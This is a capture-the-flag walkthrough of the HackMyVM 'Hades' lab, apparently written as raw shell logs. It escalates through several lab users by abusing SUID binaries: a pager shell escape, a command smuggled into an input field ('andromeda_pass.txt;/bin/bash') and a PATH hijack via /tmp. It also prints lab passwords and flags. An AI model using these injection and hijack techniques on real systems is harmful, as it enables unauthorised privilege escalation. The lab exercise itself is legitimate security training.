## 1 hacker

> Host: hades.hackmyvm.eu
> Port: 6666
> User: hacker
> Pass: begood!

```bash
C:\Users\Administrator>ssh hacker@hades.hackmyvm.eu -p 6666
The authenticity of host '[hades.hackmyvm.eu]:6666 ([185.233.104.77]:6666)' can't be established.
ECDSA key fingerprint is SHA256:ogY5Idln+pWh6WlnoFaMXjT9106jRgnOot3hq7N/W0Q.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[hades.hackmyvm.eu]:6666,[185.233.104.77]:6666' (ECDSA) to the list of known hosts.

                                                      .     **
                                                   *           *.
                                                                  ,*
                                                                     *,
                                             ,                         ,*
                                          .,                              *,
                                       /                                    *
                                    ,*                                        *,
                                 /.                                            .*.
                                                                _____
                __     __           _____         ____________      _____\    \            _____
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    |
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/|
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   ||
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/
                                                                        |___|/

                                       **                                    **.
                                          ,*                                **
                                             *,                          ,*
                                                *                      **
                                                *,                .*
                                                   *.           **
                                                      **      ,*,
                                                         ** *,
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+


hacker@hades.hackmyvm.eu's password:
Linux hades 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64

                                                      .     **
                                                   *           *.
                                                                  ,*
                                                                     *,
                                             ,                         ,*
                                          .,                              *,
                                       /                                    *
                                    ,*                                        *,
                                 /.                                            .*.
                                                                _____
                __     __           _____         ____________      _____\    \            _____
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    |
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/|
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   ||
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/
                                                                        |___|/

                                       **                                    **.
                                          ,*                                **
                                             *,                          ,*
                                                *                      **
                                                *,                .*
                                                   *.           **
                                                      **      ,*,
                                                         ** *,
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+


Last login: Mon Jul  1 09:28:47 2024 from 223.102.189.154
hacker@hades:~$ ls -la
total 32
drwxr-x--- 2 root   hacker 4096 Apr  5 06:36 .
drwxr-xr-x 1 root   root   4096 Apr  5 06:36 ..
-rw-r--r-- 1 hacker hacker  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 hacker hacker 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 hacker hacker  807 Apr 23  2023 .profile
-rw-r----- 1 root   hacker  194 Apr  5 06:36 mission.txt
-rw-r----- 1 root   hacker 2625 Apr  5 06:36 readme.txt
hacker@hades:~$ cat mission.txt 
################
# MISSION 0x01 #
################

## EN ##
User acantha has left us a gift to obtain her powers.

## ES ##
La usuaria acantha nos ha dejado un regalo para obtener sus poderes.
hacker@hades:~$ cat readme.txt 

# EN
Hi hax0r,
Welcome to HMVLab Chapter 2: Hades!
This is a slightly more advanced CTF than Chapter 1 where you will continue to practice your Linux and CTF skills
so let's keep messing around! :)
Remember that the home of each user is in /pwned/USER and in it you will find a file called mission.txt which will contain
the mission to complete to get the password of the next user.
It will also contain the file flagz.txt, which if you are registered at https://hackmyvm.eu you can enter to participate in the ranking (optional).
And to continue the improvisation, there are more secret levels and hidden flags: D
You will not have write permissions in most folders so if you need to write a script or something
use the /tmp folder, keep in mind that it is frequently deleted ...

And last (and not least) some users can modify the files that are in the
folder /www, these files are accessible from http://hades.hackmyvm.eu so if you get a user
that can modify the file /www/limbo.txt, you can put a message and it will be reflected in http://hades.hackmyvm.eu/limbo.txt.

If you have questions/ideas or want to comment anything you can join
to our Discord: https://discord.gg/DxDFQrJ

Remember that there are more people playing so be respectful.
Hack & Fun!

# ES
Hola hax0r,
Bienvenid@ al HMVLab Chapter 2: Hades!
Este es un CTF algo mas avanzado que el Chapter 1 donde continuaras practicando tus habilidades de Linux y CTF
asi que vamos a seguir trasteado! :)
Recuerda que, el home de cada usuario se encuentra en /pwned/USUARIO y en el encontraras un fichero llamado mission.txt el cual contendra
la mision a completar para conseguir la password del siguiente usuario.
Tambien contendra el fichero flagz.txt, que si estas registrado en https://hackmyvm.eu podras introducir para participar en el ranking (opcional).
Y para que continue la improvisacion, hay mas niveles secretos y flags escondidas :D
No tendras permisos de escritura en la mayoria de carpetas asi que si necesitas escribir algun script o algo
usa la carpeta /tmp, ten en cuenta que es eliminada de manera frecuente...

Y por ultimo (y no menos importante) algunos usuarios pueden modificar los ficheros que estan en la
carpeta /www, estos ficheros son accesibles desde http://hades.hackmyvm.eu asi que si consigues un usuario
que pueda modificar el fichero /www/limbo.txt, podras poner un mensaje y se verá reflejado en http://hades.hackmyvm.eu/limbo.txt.

Si tienes dudas/ideas o quieres comentar cualquier cosa puedes unirte
a nuestro Discord: https://discord.gg/DxDFQrJ

Recuerda que hay mas gente jugando asi que se respetuoso.
Hack & Fun!
hacker@hades:~$ find / -name "*gift*" -type f 2>/dev/null
/usr/share/man/man1/giftopnm.1.gz
/usr/bin/giftopnm
/opt/gift_hacker
hacker@hades:~$ file /opt/gift_hacker
-bash: file: command not found
hacker@hades:~$ strings /opt/gift_hacker 
/lib64/ld-linux-x86-64.so.2
setgid
setuid
system
__libc_start_main
__cxa_finalize
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
^uTkpiKdH
klxweBgsH
sprxyK^
/bin/bash
;*3$"
GCC: (Debian 12.2.0-14) 12.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
gift_hacker.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
_edata
_fini
system@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
__bss_start
main
setgid@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
hacker@hades:~$ cd /opt   
hacker@hades:/opt$ ls -la
total 28
drwxr-xr-x 1 root   root    4096 Apr  5 06:36 .
drwxr-xr-x 1 root   root    4096 May 24 18:23 ..
-rwSr-s--- 1 root   hacker 16064 Apr  5 06:36 gift_hacker
-r--r----- 1 ianthe ianthe    21 Apr  5 06:36 ianthe_pass.txt
hacker@hades:/opt$ cat ianthe_pass.txt 
cat: ianthe_pass.txt: Permission denied
hacker@hades:/opt$ ./gift_hacker       
acantha@hades:/opt$
```

## 2 acantha
```bash
acantha@hades:/opt$ cd ~
acantha@hades:~$ ls -la
total 32
drwxr-x--- 2 root   hacker 4096 Apr  5 06:36 .
drwxr-xr-x 1 root   root   4096 Apr  5 06:36 ..
-rw-r--r-- 1 hacker hacker  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 hacker hacker 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 hacker hacker  807 Apr 23  2023 .profile
-rw-r----- 1 root   hacker  194 Apr  5 06:36 mission.txt
-rw-r----- 1 root   hacker 2625 Apr  5 06:36 readme.txt
acantha@hades:~$ cat mission.txt 
################
# MISSION 0x01 #
################

## EN ##
User acantha has left us a gift to obtain her powers.

## ES ##
La usuaria acantha nos ha dejado un regalo para obtener sus poderes.
acantha@hades:~$ cat readme.txt 

# EN
Hi hax0r,
Welcome to HMVLab Chapter 2: Hades!
This is a slightly more advanced CTF than Chapter 1 where you will continue to practice your Linux and CTF skills
so let's keep messing around! :)
Remember that the home of each user is in /pwned/USER and in it you will find a file called mission.txt which will contain
the mission to complete to get the password of the next user.
It will also contain the file flagz.txt, which if you are registered at https://hackmyvm.eu you can enter to participate in the ranking (optional).
And to continue the improvisation, there are more secret levels and hidden flags: D
You will not have write permissions in most folders so if you need to write a script or something
use the /tmp folder, keep in mind that it is frequently deleted ...

And last (and not least) some users can modify the files that are in the
folder /www, these files are accessible from http://hades.hackmyvm.eu so if you get a user
that can modify the file /www/limbo.txt, you can put a message and it will be reflected in http://hades.hackmyvm.eu/limbo.txt.

If you have questions/ideas or want to comment anything you can join
to our Discord: https://discord.gg/DxDFQrJ

Remember that there are more people playing so be respectful.
Hack & Fun!

# ES
Hola hax0r,
Bienvenid@ al HMVLab Chapter 2: Hades!
Este es un CTF algo mas avanzado que el Chapter 1 donde continuaras practicando tus habilidades de Linux y CTF
asi que vamos a seguir trasteado! :)
Recuerda que, el home de cada usuario se encuentra en /pwned/USUARIO y en el encontraras un fichero llamado mission.txt el cual contendra
la mision a completar para conseguir la password del siguiente usuario.
Tambien contendra el fichero flagz.txt, que si estas registrado en https://hackmyvm.eu podras introducir para participar en el ranking (opcional).
Y para que continue la improvisacion, hay mas niveles secretos y flags escondidas :D
No tendras permisos de escritura en la mayoria de carpetas asi que si necesitas escribir algun script o algo
usa la carpeta /tmp, ten en cuenta que es eliminada de manera frecuente...

Y por ultimo (y no menos importante) algunos usuarios pueden modificar los ficheros que estan en la
carpeta /www, estos ficheros son accesibles desde http://hades.hackmyvm.eu asi que si consigues un usuario
que pueda modificar el fichero /www/limbo.txt, podras poner un mensaje y se verá reflejado en http://hades.hackmyvm.eu/limbo.txt.

Si tienes dudas/ideas o quieres comentar cualquier cosa puedes unirte
a nuestro Discord: https://discord.gg/DxDFQrJ

Recuerda que hay mas gente jugando asi que se respetuoso.
Hack & Fun!
acantha@hades:~$ whoami;id
acantha
uid=2043(acantha) gid=2001(hacker) groups=2001(hacker)
acantha@hades:~$ find / -user acantha -type f 2>/dev/null
/proc/3819214/task/3819214/fdinfo/0
/proc/3819214/task/3819214/fdinfo/1
/proc/3819214/task/3819214/fdinfo/2
........
/proc/3819230/timerslack_ns
/proc/3819230/patch_state
/proc/3819230/arch_status
/pazz/acantha_pass.txt
acantha@hades:~$ cat /pazz/acantha_pass.txt              
mYYLhLBSkrzZqFydxGkn
acantha@hades:~$ su -l acantha
bash: /usr/bin/su: Permission denied
acantha@hades:~$ ssh acantha@0.0.0.0
hostkeys_find_by_key_hostfile: hostkeys_foreach failed for /pwned/acantha/.ssh/known_hosts: Permission denied
The authenticity of host '0.0.0.0 (0.0.0.0)' can't be established.
ED25519 key fingerprint is SHA256:5QshhvvnibVTWOxgK9XbUejVSLahU6clfnK1Iku0wsg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not stat /pwned/acantha/.ssh: Permission denied
Failed to add the host to the list of known hosts (/pwned/acantha/.ssh/known_hosts).

                                                      .     **
                                                   *           *.
                                                                  ,*
                                                                     *,
                                             ,                         ,*
                                          .,                              *,
                                       /                                    *
                                    ,*                                        *,
                                 /.                                            .*.
                                                                _____
                __     __           _____         ____________      _____\    \            _____
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    |
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/|
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   ||
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/
                                                                        |___|/

                                       **                                    **.
                                          ,*                                **
                                             *,                          ,*
                                                *                      **
                                                *,                .*
                                                   *.           **
                                                      **      ,*,
                                                         ** *,
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+


acantha@0.0.0.0's password:
client_input_hostkeys: hostkeys_foreach failed for /pwned/acantha/.ssh/known_hosts: Permission denied
Linux hades 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64

                                                      .     **
                                                   *           *.
                                                                  ,*
                                                                     *,
                                             ,                         ,*
                                          .,                              *,
                                       /                                    *
                                    ,*                                        *,
                                 /.                                            .*.
                                                                _____
                __     __           _____         ____________      _____\    \            _____
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    |
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/|
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   ||
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/      
                                                                        |___|/

                                       **                                    **.
                                          ,*                                **
                                             *,                          ,*
                                                *                      **
                                                *,                .*
                                                   *.           **
                                                      **      ,*,
                                                         ** *,
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+


Last login: Sun Jun 30 11:48:52 2024 from 223.102.189.154
acantha@hades:~$ whoami;id
acantha
uid=2043(acantha) gid=2043(acantha) groups=2043(acantha)
acantha@hades:~$ ls -la
total 48
drwxr-x--- 2 root    acantha  4096 Apr  5 06:36 .
drwxr-xr-x 1 root    root     4096 Apr  5 06:36 ..
-rw-r--r-- 1 acantha acantha   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 acantha acantha  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 acantha acantha   807 Apr 23  2023 .profile
-rw-r----- 1 root    acantha    22 Apr  5 06:36 flagz.txt
-rw-r-x--- 1 root    acantha 16064 Apr  5 06:36 guess
-rw-r----- 1 root    acantha   275 Apr  5 06:36 mission.txt
acantha@hades:~$ cat flagz.txt 
^CaEuVJtJjaCwZtuuAFD^
acantha@hades:~$ cat mission.txt 
################
# MISSION 0x02 #
################

## EN ##
The user alala has left us a program, if we insert the 6 correct numbers, she gives us her password!

## ES ##
La usuaria alala nos ha dejado un programa, si insertamos los 6 numeros correctos, nos da su password!
acantha@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^CaEuVJtJjaCwZtuuAFD^
acantha@hades:~$ strings guess     
/lib64/ld-linux-x86-64.so.2
puts
__libc_start_main
__cxa_finalize
printf
__isoc99_scanf
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
Enter PIN code:
DsYzpJQrCEndEWIMxWxu
NO :_(
;*3$"
GCC: (Debian 12.2.0-14) 12.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
guess.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
_fini
printf@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
__bss_start
main
__isoc99_scanf@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

## 3 alala
```bash
acantha@hades:~$ su alala -l
-bash: /usr/bin/su: Permission denied
acantha@hades:~$ ssh alala@0.0.0.0 
The authenticity of host '0.0.0.0 (0.0.0.0)' can't be established.
ED25519 key fingerprint is SHA256:5QshhvvnibVTWOxgK9XbUejVSLahU6clfnK1Iku0wsg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/pwned/acantha/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/pwned/acantha/.ssh/known_hosts).
alala@hades:~$ whoami;id
alala
uid=2044(alala) gid=2044(alala) groups=2044(alala)
alala@hades:~$ ls -la
total 52
drwxr-x--- 2 root   alala   4096 Apr  5 06:36 .
drwxr-xr-x 1 root   root    4096 Apr  5 06:36 ..
-rw-r--r-- 1 alala  alala    220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 alala  alala   3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 alala  alala    807 Apr 23  2023 .profile
-r--r----- 1 althea althea    21 Apr  5 06:36 althea_pass.txt
-rw-r----- 1 root   alala     22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root   alala    164 Apr  5 06:36 mission.txt
-rwS--s--- 1 root   alala  16056 Apr  5 06:36 read
alala@hades:~$ grep -ra "\^*\^" .
grep: ./read: Permission denied
./flagz.txt:^gTdGmkwhDrCqKrDQpxH^
grep: ./althea_pass.txt: Permission denied
alala@hades:~$ cat mission.txt 
################
# MISSION 0x03 #
################

## EN ##
User althea loves reading Linux help.

## ES ##
A la usuaria althea le encanta leer la ayuda de Linux.
alala@hades:~$ ./read
alala@hades:~$ ls
althea_pass.txt  flagz.txt  mission.txt  read
alala@hades:~$ ./read althea_pass.txt
alala@hades:~$ ./read
althea                            !whoami
!done  (press RETURN)
ObxEmwisYjERrDfvSbdA              !cat althea_pass.txt
!done  (press RETURN)
```

## 4 althea
```bash
althea@hades:~$ ls -la
total 52
drwxr-x--- 2 root      althea     4096 Apr  5 06:36 .
drwxr-xr-x 1 root      root       4096 Apr  5 06:36 ..
-rw-r--r-- 1 althea    althea      220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 althea    althea     3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 althea    althea      807 Apr 23  2023 .profile
-r--r----- 1 andromeda andromeda    21 Apr  5 06:36 andromeda_pass.txt
-rw-r----- 1 root      althea       22 Apr  5 06:36 flagz.txt
-rwS--s--- 1 root      althea    16216 Apr  5 06:36 lsme
-rw-r----- 1 root      althea      205 Apr  5 06:36 mission.txt
althea@hades:~$ cat flagz.txt 
^btDtPAPzSiXmoHItpqX^
althea@hades:~$ cat mission.txt 
################
# MISSION 0x04 #
################

## EN ##
The user andromeda has left us a program to list directories.

## ES ##
La usuaria andromeda nos ha dejado un programa para listar directorios.
althea@hades:~$ grep -ra "\^*\^" .
./flagz.txt:^btDtPAPzSiXmoHItpqX^
grep: ./lsme: Permission denied
grep: ./andromeda_pass.txt: Permission denied
althea@hades:~$ lsme
-bash: lsme: command not found
althea@hades:~$ ./lsme
Enter file to check:
andromeda_pass.txt
-r--r----- 1 andromeda andromeda 21 Apr  5 06:36 andromeda_pass.txt
Segmentation fault
althea@hades:~$ ls -la
total 52
drwxr-x--- 2 root      althea     4096 Apr  5 06:36 .
drwxr-xr-x 1 root      root       4096 Apr  5 06:36 ..
-rw-r--r-- 1 althea    althea      220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 althea    althea     3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 althea    althea      807 Apr 23  2023 .profile
-r--r----- 1 andromeda andromeda    21 Apr  5 06:36 andromeda_pass.txt
-rw-r----- 1 root      althea       22 Apr  5 06:36 flagz.txt
-rwS--s--- 1 root      althea    16216 Apr  5 06:36 lsme
-rw-r----- 1 root      althea      205 Apr  5 06:36 mission.txt
althea@hades:~$ ./lsme
Enter file to check:
andromeda_pass.txt
-r--r----- 1 andromeda andromeda 21 Apr  5 06:36 andromeda_pass.txt
Segmentation fault
althea@hades:~$ ./lsme
Enter file to check:
andromeda_pass.txt;whoami
-r--r----- 1 andromeda andromeda 21 Apr  5 06:36 andromeda_pass.txt
andromeda
Segmentation fault
althea@hades:~$ ./lsme
Enter file to check:
andromeda_pass.txt;/bin/bash
-r--r----- 1 andromeda andromeda 21 Apr  5 06:36 andromeda_pass.txt
andromeda@hades:~$ whoami;id
andromeda
uid=2046(andromeda) gid=2045(althea) groups=2045(althea)
```

## 5 andromeda
```bash
andromeda@hades:~$ ls -la
total 52
drwxr-x--- 2 root      althea     4096 Apr  5 06:36 .
drwxr-xr-x 1 root      root       4096 Apr  5 06:36 ..
-rw-r--r-- 1 althea    althea      220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 althea    althea     3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 althea    althea      807 Apr 23  2023 .profile
-r--r----- 1 andromeda andromeda    21 Apr  5 06:36 andromeda_pass.txt
-rw-r----- 1 root      althea       22 Apr  5 06:36 flagz.txt
-rwS--s--- 1 root      althea    16216 Apr  5 06:36 lsme
-rw-r----- 1 root      althea      205 Apr  5 06:36 mission.txt
andromeda@hades:~$ cat andromeda_pass.txt 
OTWGTbHzrxhYFSTlKcOt
andromeda@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^btDtPAPzSiXmoHItpqX^
grep: ./lsme: Permission denied
andromeda@hades:~$ pwd
/pwned/althea
andromeda@hades:~$ cd ~
andromeda@hades:~$ pwd
/pwned/althea
andromeda@hades:~$ ssh andromeda@0.0.0.0 
hostkeys_find_by_key_hostfile: hostkeys_foreach failed for /pwned/andromeda/.ssh/known_hosts: Permission denied
The authenticity of host '0.0.0.0 (0.0.0.0)' can't be established.
ED25519 key fingerprint is SHA256:5QshhvvnibVTWOxgK9XbUejVSLahU6clfnK1Iku0wsg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not stat /pwned/andromeda/.ssh: Permission denied
Failed to add the host to the list of known hosts (/pwned/andromeda/.ssh/known_hosts).

                                                      .     **
                                                   *           *.
                                                                  ,*
                                                                     *,
                                             ,                         ,*
                                          .,                              *,
                                       /                                    *
                                    ,*                                        *,
                                 /.                                            .*.
                                                                _____
                __     __           _____         ____________      _____\    \            _____
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    |
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/|
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   ||
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/
                                                                        |___|/

                                       **                                    **.
                                          ,*                                **
                                             *,                          ,*
                                                *                      **
                                                *,                .*
                                                   *.           **
                                                      **      ,*,
                                                         ** *,
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+


andromeda@0.0.0.0's password:
client_input_hostkeys: hostkeys_foreach failed for /pwned/andromeda/.ssh/known_hosts: Permission denied
Linux hades 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64

                                                      .     **
                                                   *           *.
                                                                  ,*
                                                                     *,
                                             ,                         ,*
                                          .,                              *,
                                       /                                    *
                                    ,*                                        *,
                                 /.                                            .*.
                                                                _____
                __     __           _____         ____________      _____\    \            _____
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    |
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/|
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   ||
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|     
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/
                                                                        |___|/

                                       **                                    **.
                                          ,*                                **
                                             *,                          ,*
                                                *                      **
                                                *,                .*
                                                   *.           **
                                                      **      ,*,
                                                         ** *,
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+


Last login: Sat Jun 29 17:06:41 2024 from 193.233.133.212
andromeda@hades:~$ pwd
/pwned/andromeda
andromeda@hades:~$ ls -la
total 52
drwxr-x--- 2 root      andromeda  4096 Apr  5 06:36 .
drwxr-xr-x 1 root      root       4096 Apr  5 06:36 ..
-rw-r--r-- 1 andromeda andromeda   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 andromeda andromeda  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 andromeda andromeda   807 Apr 23  2023 .profile
-r--r----- 1 anthea    anthea       21 Apr  5 06:36 anthea_pass.txt
-rw-r----- 1 root      andromeda    22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root      andromeda   166 Apr  5 06:36 mission.txt
-rwS--s--- 1 root      andromeda 16056 Apr  5 06:36 uid
andromeda@hades:~$ grep -ra '\^*\^' .
grep: ./anthea_pass.txt: Permission denied
./flagz.txt:^xzsHGrOeNctIZLGKzWq^
grep: ./uid: Permission denied
andromeda@hades:~$ cat mission.txt 
################
# MISSION 0x05 #
################

## EN ##
The user anthea reminds us who we are.

## ES ##
La usuaria anthea procura que no olvidemos quien somos.
andromeda@hades:~$ ./uid
uid=2047(anthea) gid=2046(andromeda) groups=2046(andromeda)
andromeda@hades:~$ ./uid
uid=2047(anthea) gid=2046(andromeda) groups=2046(andromeda)
andromeda@hades:~$ cat anthea_pass.txt
cat: anthea_pass.txt: Permission denied
andromeda@hades:~$ id
uid=2046(andromeda) gid=2046(andromeda) groups=2046(andromeda)
```

猜测先修改了uid，然后运行了id，最后再改回来了，尝试劫持环境变量：

```bash
andromeda@hades:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
andromeda@hades:~$ ln -s /bin/bash /tmp/id
ln: failed to create symbolic link '/tmp/id': File exists
andromeda@hades:~$ rm /tmp/id
andromeda@hades:~$ ln -s /bin/bash /tmp/id
andromeda@hades:~$ PATH=/tmp:$PATH
andromeda@hades:~$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
andromeda@hades:~$ id
andromeda@hades:~$ ./uid
anthea@hades:~$ rm /tmp/id
anthea@hades:~$ PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games;echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
anthea@hades:~$ cat anthea_pass.txt 
yWFLtSNQArEBTHtWgkKd
```

## 6 anthea
```bash
anthea@hades:~$ ls -la
total 52
drwxr-x--- 2 root      anthea     4096 Apr  5 06:36 .
drwxr-xr-x 1 root      root       4096 Apr  5 06:36 ..
-rw-r--r-- 1 anthea    anthea      220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 anthea    anthea     3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 anthea    anthea      807 Apr 23  2023 .profile
-r--r----- 1 aphrodite aphrodite    21 Apr  5 06:36 aphrodite_pass.txt
-rw-r----- 1 root      anthea       22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root      anthea      175 Apr  5 06:36 mission.txt
-rwS--s--- 1 root      anthea    16256 Apr  5 06:36 obsessed
anthea@hades:~$ grep -ra '\^*\^' .
grep: ./obsessed: Permission denied
grep: ./aphrodite_pass.txt: Permission denied
